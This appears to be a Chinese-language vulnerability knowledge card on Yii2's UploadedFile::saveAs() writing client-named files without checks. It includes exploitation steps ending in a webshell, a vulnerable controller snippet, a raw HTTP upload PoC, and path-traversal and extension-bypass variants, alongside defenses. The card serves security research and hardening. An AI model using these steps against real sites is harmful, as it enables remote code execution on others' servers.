---
id: web-php-framework-yii2-uploadedfile-saveas-unfiltered
title: Yii2 UploadedFile::saveAs 不做校验：客户端文件名直入保存路径导致任意脚本上传
type: scenario
domain: web
path: web/php/framework
technique: yii2-saveas-unfiltered-upload
aliases:
- Yii2 文件上传
- UploadedFile::saveAs
- Yii2 saveAs 风险
- yii2-app-basic 上传
- CVE-2025-65657 根因
tags:
- php
- yii2
- file-upload
- saveas
- uploadedfile
- unrestricted-upload
- framework-pitfall
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Yii2 2.0.1 - 2.0.54
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T06:00:34+08:00'
  notes: 已对照原文与全部图片核对：saveAs 两版实现（2.0.1-2.0.19 error==UPLOAD_ERR_OK 直接 move/copy；2.0.20-2.0.54 hasError→move_uploaded_file）均无过滤，demo 复现截图一致；未在本机复现。
---

## 一句话结论

Yii2 的 `UploadedFile::saveAs()` 只负责把临时文件移动/复制到调用方给的路径，不校验扩展名、MIME、文件头或落点；当业务把客户端可控的 `$file->name` 拼进 Web 目录路径再调用 `saveAs()` 时，上传 `phpinfo.php`（Content-Type 伪造为 image/png）即可在 Web 根落盘并执行。

## 原理

- `saveAs($file, $deleteTempFile = true)` 的实现只做两件事：检查上传错误状态，然后 `move_uploaded_file($this->tempName, $targetFile)`（或 `copy`）；`$targetFile` 由调用方传入，框架不检查其扩展名、目录或内容。
- 两个版本实现略有差异：2.0.1–2.0.19 在 `error === UPLOAD_ERR_OK` 时移动/复制；2.0.20–2.0.54 先判断 `hasError`，再处理 `_tempResource` 或 `move_uploaded_file`。共同点是都不做安全校验。
- `UploadedFile->name` 来自客户端 multipart 的 `filename`，完全可控；`$file->tempName` 是 PHP 临时文件。开发者若写成 `$uploadPath = @webroot/uploads/ . $file->name; $file->saveAs($uploadPath)`，最终路径和扩展名都由攻击者决定。
- 框架把“移动文件”和“安全校验”拆成两件事，安全责任落在二次开发代码；大量 Yii2 项目误以为框架会处理上传安全，直接使用原文件名落盘。
- 即使保存目录不在 Web 根，若后续有下载/包含/模板渲染等消费点，仍可能造成任意文件读取或代码包含；落到 Web 目录则直接 getshell。

## 触发条件

- Yii2 2.0.1–2.0.54（saveAs 两版实现均无过滤）。
- 业务代码在调用 `saveAs()` 前没有扩展名白名单、MIME/魔数校验或文件名重写。
- 保存路径使用 `$file->name` 或其它客户端可控字段，且落在 Web 服务器可解析的目录。
- Web 服务器按扩展名解析 PHP（Apache/Nginx+PHP-FPM 等）。

## 利用步骤

1. 找到使用 `UploadedFile::getInstanceByName()` / `getInstance()` 并调用 `saveAs()` 的上传点。
2. 判断保存路径是否拼接了 `$file->name`，以及目录是否在 Web 根下。
3. 上传内容为 `<?=phpinfo()?>`（或一句话木马）的文件，文件名设为 `phpinfo.php`，Content-Type 设为 `image/png` 绕过前端/弱校验。
4. 根据响应中的路径或可预测的命名规则访问 `/uploads/phpinfo.php`。
5. 确认 PHP 执行后，替换为功能更完整的 WebShell。

## PoC

存在风险的控制器写法（原文 demo）：

```php
$file = UploadedFile::getInstanceByName('file');
if ($file && $file->error === UPLOAD_ERR_OK) {
    $uploadPath = \Yii::getAlias('@webroot/uploads/') . $file->name;
    if ($file->saveAs($uploadPath)) {
        $url = \Yii::getAlias('@web/uploads/') . $file->name;
        // 返回 $url
    }
}
```

上传：

```http
POST /?r=file/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="phpinfo.php"
Content-Type: image/png

<?=phpinfo()?>
------x--
```

访问 `http://target/uploads/phpinfo.php`，页面输出 PHP 版本信息，证明脚本已执行。

## 变体与关联

- 文件名路径穿越：`$file->name` 设为 `../../shell.php`，若 `saveAs` 前未做 basename/规范化，可写出上传目录。
- 只校验 Content-Type 或前端 JS 后缀：改包即可绕过；Yii2 的 `FileValidator` 若只配 `extensions` 而保存时仍用原名，也可能被双后缀/大小写绕过。
- 相同模式也出现在其它框架的“移动上传文件”API（如 Laravel `storeAs`、ThinkPHP `move`）；核心都是“保存路径/文件名可控 + 无二次校验”。
- 具体产品案例见 [[web-generic-file-upload-feehicms-ad-upload-saveas-rce]]（FeehiCMS 广告上传 CVE-2025-65657）。
- 与 [[web-generic-file-upload-extension-zero-check]] 的差异：本卡聚焦 Yii2 `saveAs` API 的责任边界与典型误用。

## 检测与防御

- 保存前用 Yii2 `FileValidator` 配置 `extensions`（白名单）、`mimeTypes`、`maxSize`，并检查 `$file->getExtension()`；不要只信 `$file->type`。
- 重写文件名：使用随机 UUID + 白名单后缀，丢弃客户端原名；保存路径用固定目录 + basename。
- 上传目录移出 Web 根；必须公开时，禁止该目录执行 PHP（Nginx `location ~ \.php$ { deny all; }`、Apache `php_flag engine off`）。
- 对图片做二次渲染/魔数校验；服务端生成缩略图，不直接保存原文件。
- 检测：上传请求文件名含 `.php`/`.phtml` 等脚本后缀但 Content-Type 为图片；Web 目录出现新增 PHP 文件；访问上传目录的 PHP 返回 200 且响应含 PHP 版本/脚本输出。
